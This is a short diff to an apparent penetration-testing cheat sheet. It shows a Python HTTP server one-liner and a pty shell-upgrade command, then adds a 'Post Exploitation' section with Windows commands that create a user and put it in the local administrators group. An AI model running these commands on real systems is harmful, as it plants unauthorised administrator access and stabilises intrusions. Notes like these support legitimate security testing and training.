@@ -9,3 +9,11 @@ python -m SimpleHTTPServer 80
 ### Shell Upgrade!
 
 python -c "import pty; pty.spawn('/bin/bash')"
+
+
+### Post Exploitation
+
+Add new user and add to local admin group
+
+> net user gary password /add
+> net localgroup administrators gary /add
